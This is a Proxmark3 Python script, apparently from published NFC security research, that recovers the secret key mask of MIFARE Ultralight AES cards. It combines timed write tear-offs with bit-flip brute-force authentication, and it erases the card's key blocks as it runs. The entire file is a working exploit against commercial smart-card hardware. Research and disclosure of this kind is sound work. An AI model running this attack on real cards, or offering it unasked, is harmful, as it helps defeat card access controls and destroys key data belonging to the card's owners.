#!/usr/bin/env python3

# Recover the shared key mask specific to an Ultralight AES card
# 
# Conditions:
# * key blocks not locked by LOCK_KEYS
#
# Current limitations:
# * AUTH0 needs to allow unauthenticated writes to key blocks
#
# Attention points:
# * All key blocks of the corresponding key will be erased!!
#
# doegox & noproto, 2025
# cf "BREAKMEIFYOUCAN!: Exploiting Keyspace Reduction and Relay Attacks in 3DES and AES-protected NFC Technologies"
# for more info

import sys
import argparse
import time
import pm3

total_auth = 0
debug = False

def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def construct_key(key_segment, segment):
    """Construct the full key from the segment and its value."""
    assert segment < 4
    if segment == 0:
        key = f'{key_segment:08x}000000000000000000000000'
    elif segment == 1:
        key = f'00000000{key_segment:08x}0000000000000000'
    elif segment == 2:
        key = f'0000000000000000{key_segment:08x}00000000'
    elif segment == 3:
        key = f'000000000000000000000000{key_segment:08x}'
    return key


def auth(p, key_segment, idx, segment, retries=0):
    """Authenticate with the given key, key index and segment."""
    global total_auth
    assert idx < 3
    assert segment < 4
    key = construct_key(key_segment, segment)
    console_debug(p, f'hf mfu aesauth -i {idx} --key {key} --retries {retries}', debug=debug)
    success = False
    for line in p.grabbed_output.split('\n'):
        if "Authentication" in line:
            if "ok" in line:
                success = True
            if "attempts:" in line:
                start = line.find(":") + 1
                attempts = int(line[start:].strip())
                total_auth += attempts
    return success


def bruteforce_key(p, key_segment, idx, segment, retries=5, bitflips=2):
    """Bruteforce the key by flipping bits and checking authentication."""
    global total_auth
    sys.stdout.flush()
    key = construct_key(key_segment, segment)
    console_debug(p,
                  f'hf mfu aeschk -i {idx} '
                  f'-f mfulaes_segment_hw{bitflips}.dic '
                  f'--segment {segment} '
                  f'--key {key} '
                  f'--retries {retries} '
                  f'--xor', debug=debug)
    key = None
    for line in p.grabbed_output.split('\n'):
        if "Authentication attempts:" in line:
            start = line.find(":") + 1
            attempts = int(line[start:].strip())
            total_auth += attempts
        if "found valid key" in line:
            line = line[line.index("key") + 1:]
            start = line.find("[") + 1
            end = line.find("]")
            test_key = int(line[start:end].replace(" ", ""), 16)
            print(f"Auth succeeded with key: {test_key:032X}")
            sys.stdout.flush()
            key = (test_key >> (32 * (3 - segment))) & 0xFFFFFFFF
    return key


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


def main():
    """
    Recover the shared key mask specific to an Ultralight AES card

    Conditions:
    * key blocks not locked by LOCK_KEYS

    Current limitations:
    * AUTH0 needs to allow unauthenticated writes to key blocks

    Attention points:
    * All key blocks of the corresponding key will be erased!!

    Examples:

    - Recover key mask block 48 (DataProt):
          $ pm3 -y 'mfulaes_mask_recovery --block 48'
      or, from the client:
          pm3 --> script run mfulaes_mask_recovery --block 48
    """
    parser = argparse.ArgumentParser(
        description=main.__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('--init', type=lambda x: int(x, 0), default=0x00000000, help='Initial key block value (hex)')
    parser.add_argument('--final', type=lambda x: int(x, 0), default=0x00000000, help='Final key block value (hex)')
    parser.add_argument('--block', type=lambda x: int(x, 0), required=True,
                        help='Block number (hex or int) DataProt:48-51 UIDRetr:52-55')
    parser.add_argument('--tear1', type=int, default=280, help='First tearoff value (us)')
    parser.add_argument('--tear2', type=int, default=230, help='Second tearoff value (us)')
    parser.add_argument('--max_hd_diff', type=int, default=2, help='Maximum Hamming distance difference')
    parser.add_argument('--fast_retries', type=int, default=10, help='Number of fast retries')
    parser.add_argument('--slow_retries', type=int, default=3, help='Number of slow retries')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    args = parser.parse_args()

    init = args.init
    final = args.final
    block = args.block
    tear1 = args.tear1
    tear2 = args.tear2
    max_hd_diff = args.max_hd_diff
    fast_retries = args.fast_retries
    slow_retries = args.slow_retries
    global debug
    debug = args.debug
    segment = 3 - ((block - 48) % 4)
    idx = (block - 48) // 4
    assert idx < 2
    initkey = int.from_bytes(init.to_bytes(4, 'big')[::-1], 'big')
    ntear2 = 0
    max_hd = 0
    keys = []
    p = pm3.pm3()
    start_time = time.time()
    # Erase the key
    console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
    for i in range(48 + 4*idx, 52 + 4*idx):
        console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
    assert auth(p, 0, idx, 0), "We cannot erase the key, aborting..."
    while tear1 > 0:
        console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{init:08x}', capture=False, debug=debug)
        print(f"Testing with initial tearoff value: {tear1} ms")
        console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        key = initkey
        if auth(p, key, idx, segment):
            break
        tear1 -= 5
        tear2 -= 5
    assert tear1 > 0

    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

    keys.insert(0, key)
    # Drop the already known intermediate keys here to accelerate the search when repeating on the same segment
    extrakeys = [][::-1]

    while True:
        print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
        print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms")
        print(f"Max HD: {max(hamming_distance(k, initkey) for k in keys)}")
        sys.stdout.flush()
        nsame = 0
        tear2_copy = tear2
        tear2_changed = False
        while auth(p, key, idx, segment, retries=fast_retries):
            print(f"Testing with extra tearoff value: {tear2_copy} ms")
            sys.stdout.flush()
            console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
            ntear2 += 1
            nsame += 1
            if ((nsame >= 20 and key != initkey) or nsame >= 40) and not tear2_changed:
                tear2_copy = int(tear2 * 1.05)
                console_debug(p, f'hw tearoff --delay {tear2_copy}', capture=False, debug=debug)
                tear2_changed = True
            if (nsame >= 50 and key != initkey) or nsame >= 100:
                print(f"Stopping after {nsame} successful authentications with the same key.")
                print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
                print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms (last {nsame} tears just for confirmation)")
                print(f'Block {block:2} (0x{block:02x}) segment key mask probably found:'
                      f' {keys[0]:08X} '
                      f'(mask block value: {int.from_bytes(keys[0].to_bytes(4, 'big')[::-1], 'big'):08X})'
                      f' with HD={hamming_distance(keys[0], initkey):2d}')
                print(f"Total authentications: {total_auth}")
                current_time = time.time()
                elapsed_time = current_time - start_time
                minutes, seconds = divmod(elapsed_time, 60)
                print(f"Time spent since start: {int(minutes)} minutes {seconds:.2f} seconds")
                sys.stdout.flush()
                # Erase the key
                console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
                for i in range(48 + 4*idx, 52 + 4*idx):
                    console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
                exit(0)
        if tear2_changed:
            console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

        newkey = None
        for key in keys:
            if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                continue
            print(f"Trying known keys: {key:08X}")
            sys.stdout.flush()
            if auth(p, key, idx, segment, fast_retries):
                newkey = key
                break
        else:
            for key in extrakeys:
                if key not in keys:
                    if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                        continue
                    print(f"Trying extra key: {key:08X}")
                    sys.stdout.flush()
                    if auth(p, key, idx, segment, fast_retries):
                        newkey = key
                        break
            else:
                for key in keys:
                    if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                        continue
                    print(f"Trying 1 bitflip from key: {key:08X}")
                    sys.stdout.flush()
                    newkey = bruteforce_key(p, key, idx, segment, fast_retries, bitflips=1)
                    if newkey is not None:
                        break
                else:
                    for key in keys:
                        if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                            continue
                        print(f"Trying 2 bitflips from key: {key:08X}")
                        sys.stdout.flush()
                        newkey = bruteforce_key(p, key, idx, segment, slow_retries, bitflips=2)
                        if newkey is not None:
                            break
        assert newkey is not None
        if newkey not in keys:
            keys = insert_key(keys, newkey, initkey=initkey)
            max_hd = max(hamming_distance(k, initkey) for k in keys)
            print(f"New key found: {newkey:08X} with HD={hamming_distance(newkey, initkey):02d}, "
                  f"max HD in keys: {max_hd:02d}")
            sys.stdout.flush()
        key = max(keys, key=lambda k: hamming_distance(k, initkey))
        print(f"Testing with extra tearoff value: {tear2_copy} ms")
        sys.stdout.flush()
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        ntear2 += 1


if __name__ == '__main__':
    main()
